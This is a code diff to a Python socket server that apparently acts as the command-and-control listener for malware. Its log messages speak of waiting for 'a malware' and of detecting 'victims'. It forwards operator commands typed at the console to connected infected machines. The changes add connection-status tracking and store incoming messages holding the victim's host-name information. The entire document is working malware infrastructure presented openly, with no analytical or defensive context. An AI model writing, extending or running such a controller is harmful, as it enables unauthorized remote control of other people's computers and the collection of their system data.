@@ -16,6 +16,11 @@ class Server:
         self.MESSAGE_LENGTH_SIZE = 64
         self.ENCODING = 'utf-8'
         self.ADDRESS_INFORMATION = (self.HOST, self.PORT)
+        self.received_data = ''
+        self.status = 'WAITING'
+
+    def get_received_info(self):
+        return self.received_data
 
     def send_message(self, client, msg):
         message = msg.encode(self.ENCODING)
@@ -32,8 +37,10 @@ class Server:
         gets = [server, sys.stdin]
 
         while True:
+            self.status = 'WAITING'
             print('{}\t[WAITING] waiting for a malware...'.format(ctime()))
             client, addr = server.accept()
+            self.status = 'VICTIM FOUNDED'
             print('{}\t[VICTIM DETECTED] new connection from {}:{}'.format(ctime(), addr[0], addr[1]))
             gets.append(client)
 
@@ -46,13 +53,17 @@ class Server:
                             message = client.recv(message_length).decode(self.ENCODING)
                             if not message:
                                 break
+                            self.status = 'MESSAGE RECEIVED'
                             print('{}\t[MESSAGE RECEIVED] malware: {}'.format(ctime(), message))
+                            if '\n-------\nHost Name: ' in message:
+                                self.received_data = message
                         else:
                             message = input()
                             if not message:
                                 break
                             self.send_message(client, message)
                 except ValueError:
+                    self.status = 'CONNECTION LOST'
                     print('{}\t[CONNECTION LOST]'.format(ctime()))
                     break
             client.close()
